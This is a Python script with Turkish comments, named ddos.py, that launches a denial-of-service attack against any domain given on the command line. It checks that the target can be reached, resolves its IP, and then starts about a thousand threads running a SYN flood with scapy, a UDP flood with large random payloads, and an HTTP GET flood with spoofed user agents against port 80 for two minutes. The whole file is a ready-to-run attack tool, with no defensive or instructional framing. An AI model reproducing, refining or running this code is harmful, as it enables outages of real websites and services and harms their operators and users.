import sys
import socket
import threading
import time
import random
from scapy.all import IP, TCP, send, RandShort

# Hedef kontrolü
def check_target(url):
    try:
        import requests
        r = requests.get("http://" + url, timeout=3)
        return True
    except:
        return False

# SYN Flood
def syn_flood(ip, port):
    try:
        packet = IP(dst=ip)/TCP(dport=port, sport=RandShort(), flags="S", seq=random.randint(1000, 5000))
        send(packet, verbose=False, loop=1)
    except:
        pass

# UDP Flood
def udp_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(65500)
    while time.time() < timeout:
        try:
            sock.sendto(payload, (ip, port))
        except:
            pass

# HTTP GET Flood
def http_flood(url, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            import requests
            requests.get("http://" + url, headers={"User-Agent": random.choice(["Mozilla/5.0", "GoogleBot", "BingBot"])}, timeout=1)
        except:
            pass

def main():
    if len(sys.argv) != 2:
        print("Kullanım: python ddos.py <hedef_domain>")
        return

    domain = sys.argv[1]
    print("Hedef kontrol ediliyor...")
    if not check_target(domain):
        print("BAŞARISIZ - Hedef siteye erişilemiyor")
        return

    try:
        target_ip = socket.gethostbyname(domain)
        print(f"BAŞARILI - IP: {target_ip}")
    except:
        print("BAŞARISIZ - IP çözümlenemedi")
        return

    port = 80
    duration = 120
    thread_count = 1000

    print(f"{duration} saniye, {thread_count} thread ile saldırı başlıyor...")

    for _ in range(thread_count // 3):
        threading.Thread(target=syn_flood, args=(target_ip, port), daemon=True).start()
    for _ in range(thread_count // 3):
        threading.Thread(target=udp_flood, args=(target_ip, port, duration), daemon=True).start()
    for _ in range(thread_count // 3):
        threading.Thread(target=http_flood, args=(domain, duration), daemon=True).start()

    time.sleep(duration)
    print("Saldırı tamamlandı.")

if __name__ == "__main__":
    main()